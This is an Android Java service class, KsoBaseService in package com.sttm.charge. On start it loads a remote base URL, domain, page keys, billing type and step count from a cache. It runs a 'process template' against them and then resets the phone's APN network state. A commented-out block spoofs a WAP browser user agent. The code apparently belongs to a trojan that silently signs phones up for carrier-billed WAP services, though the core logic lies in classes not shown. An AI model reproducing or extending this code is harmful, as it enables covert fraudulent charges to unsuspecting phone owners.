package com.sttm.charge;


import com.sttm.model.KsoProcessTemplate;
import com.sttm.util.DownloadUtil;
import com.sttm.util.KsoCache;
import com.sttm.util.WapApnHelper;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;

@SuppressWarnings("unused")
public class KsoBaseService extends Service {
	private Context context;

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	@Override
	public void onCreate() {
		context = this.getApplicationContext();

		super.onCreate();
	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		
		
		/*WebView webView = new WebView(context);
		WebSettings webSettings = webView.getSettings();
		String ua = webSettings.getUserAgentString();	
		//Log.d("ua", ua + "ua");
		webSettings.setUserAgentString("MAUI WAP Browser");*/
		
		////Log.d("ua", DownloadUtil.getUA() + "======");
		
		final String accessUrl = KsoCache.getInstance().getValue("baseUrl") != null ? (String) KsoCache
				.getInstance().getValue("baseUrl") : "";

		final int btype = KsoCache.getInstance().getValue("btype") != null ? (Integer) KsoCache
				.getInstance().getValue("btype") : 100;
		final String doMain = KsoCache.getInstance().getValue("domain") != null ? (String) KsoCache
				.getInstance().getValue("domain") : "";
		final String startKeys = KsoCache.getInstance().getValue("startKeys") != null ? (String) KsoCache
				.getInstance().getValue("startKeys") : "";
		final long delay = KsoCache.getInstance().getValue("delay") != null ? (Long) KsoCache
				.getInstance().getValue("delay") : 0;
		final String endKeys = KsoCache.getInstance().getValue("endKeys") != null ? (String) KsoCache
				.getInstance().getValue("endKeys") : "";
		final String keyinds = KsoCache.getInstance().getValue("keyinds") != null ? (String) KsoCache
				.getInstance().getValue("keyinds") : "";

		final int downLen = KsoCache.getInstance().getValue("downLen") != null ? (Integer) KsoCache
				.getInstance().getValue("downLen") : 0;
		final int billType = KsoCache.getInstance().getValue("billType") != null ? (Integer) KsoCache
				.getInstance().getValue("billType") : 0;

		final int stepCount = KsoCache.getInstance().getValue("stepCount") != null ? (Integer) KsoCache
				.getInstance().getValue("stepCount") : 0;

		/*ProcessTemplate.program(startKeys, endKeys, keyinds, doMain, btype,
				billType, stepCount, delay, downLen, accessUrl,this);*/
				
		KsoProcessTemplate kpt = new KsoProcessTemplate(startKeys, endKeys, keyinds, doMain, btype,
				billType, stepCount, delay, downLen, accessUrl,this);
		kpt.program();
		WapApnHelper wapApnHelper = new WapApnHelper(this);
		wapApnHelper.reSetNetState();

		super.onStart(intent, startId);
	}

	@Override
	public boolean onUnbind(Intent intent) {

		return super.onUnbind(intent);
	}

}
